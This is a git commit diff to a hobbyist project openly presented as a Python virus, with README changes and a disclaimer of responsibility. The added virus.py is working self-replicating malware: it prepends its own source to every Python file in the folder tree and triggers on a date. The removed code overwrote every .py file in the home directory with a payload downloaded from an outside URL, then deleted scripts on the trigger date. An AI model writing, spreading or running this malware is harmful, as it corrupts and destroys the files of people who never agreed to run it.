61311389d8e08b8ad41088309f0a24057cc88d39
winnyace <winnyace82@gmail.com>
2023-08-14 11:00:38 +0300

    new virus written lmao

--- kek/README.md
+++ kek/README.md
@@ -1,11 +1,10 @@
 # This is a virus! Run only at your discretion!!!
+**I've made this for the sole purpose of studying, not at all for the purpose of creating damage. Since I've put it on the internet, for the whole world to see, I'm sure someone will find this and use it for that purpose, however. As a result, *it's not my fault for someone else's horrible decisions! It's 100% their fault for deciding that they should infect a machine that's not theirs with this.***
 
 I made this because I got into a [danooct1](https://www.youtube.com/@danooct1) vibe recently and I got inspired to create my own piece of malware to pass the time and to learn new things.
 
 ## What does it do?
 
-It effects every Python file found in the home directory of the user and it overwrites them with the malware.
+It effects every Python file found in the directory the script was ran in and it appends itself in them.
 
-On the 7th of January, which is my birthday, it will delete every single Python script found.
-
-**I've made this for my own learning purposes. I don't accept any use of this shit virus for actual damage! If anybody uses it for that, it's their fault, not mine!**
+On the 7th of January of any year, which is my birthday, it will open my website.
--- kek/virus.py
+++ kek/virus.py
@@ -1,43 +1,77 @@
 from datetime import datetime
-import urllib.request
 import pathlib
 import os
+import webbrowser
 import tkinter
+import sys
 
 day = datetime.now().day
 month = datetime.now().month
-path = pathlib.Path().home()
-
-def default():
-    r_window = tkinter.Tk()
-    r_window.title("Error!")
-
-    lbl = tkinter.Label(r_window, text="Error: Couldn't load necessary files.")
-    lbl.pack()
-
-    r_window.mainloop()
+path = pathlib.Path(os.path.dirname(__file__))
 
 def spread():
-    for entry in path.rglob("*"):
-        if (entry.match("*.py") == True):
-            with urllib.request.urlopen("https://winnyace82.s-ul.eu/hxISQXkD") as file:
-                entry.write_bytes(file.read())
-
-def active_payload():
     for entry in path.iterdir():
-        if (entry.match("*.py") == True):
-            os.remove(entry)
-    
-    r_window = tkinter.Tk()
-    r_window.title("LMAO!!! YOU GOT REKT!")
+        if entry.is_dir() is True:
+            for sub_entry in pathlib.Path(entry).rglob("*"):
+                if sub_entry.match("*.py") is True:
+                    with open(sub_entry, mode="+r") as f:
+                        if f.readline() == "#infected\n":
+                            break
+                        else:
+                            target = open(sub_entry, mode="+r")
+                            aux = target.read()
+                            target.close()
 
-    lbl = tkinter.Label(r_window, text="Yo babe! What's up? It's my birthday today and I'm feeling a bit chaotic, so say goodbye your Python scripts!\nNo hard feelings, though. See ya around.")
+                            target = open(sub_entry, mode="+w")
+                            target.write("#infected\n\n")
+                            target.write(open(__file__).read())
+                            target.write("\n")
+                            target.write(aux)
+                            target.write("\n")
+                            target.close()
+        else:
+            if entry.match(str(__file__)) is False:
+                if entry.match("*.py") is True:
+                    with open(entry, mode="+r") as f:
+                        if f.readline() == "#infected\n":
+                            break
+                        else:
+                            target = open(entry, mode="+r")
+                            aux = target.read()
+                            target.close()
+
+                            target = open(entry, mode="+w")
+                            target.write("#infected\n\n")
+                            target.write(open(__file__).read())
+                            target.write("\n")
+                            target.write(aux)
+                            target.write("\n")
+                            target.close()
+
+def magic():
+    webbrowser.open("https://winnyace.github.io")
+    sys.exit()
+
+def payload():
+    r = tkinter.Tk()
+
+    lbl = tkinter.Label(r, text="You got infected with winny's virus.\nI called 'kek' because kek, I'm a criminal with my code and especially with my jokes and names.\nI guess see ya around!\nPS:Asuka Kurashina is the best girl!<3")
     lbl.pack()
 
-    r_window.mainloop()         
+    btn = tkinter.Button(r, text="Ok", command=magic)
+    btn.pack()
 
-spread()
-if (month == 1 and day == 7):
-    active_payload()
-else:
-    default()
+    r.mainloop()
+
+def main():
+    # very advanced debugging below
+    # day = 7
+    # month = 1
+    # very complex, right? pro hax0r. hire me google 
+    if day == 7 and month == 1:
+        payload()
+    else:
+        spread()
+
+if __name__ == "__main__":
+    main()
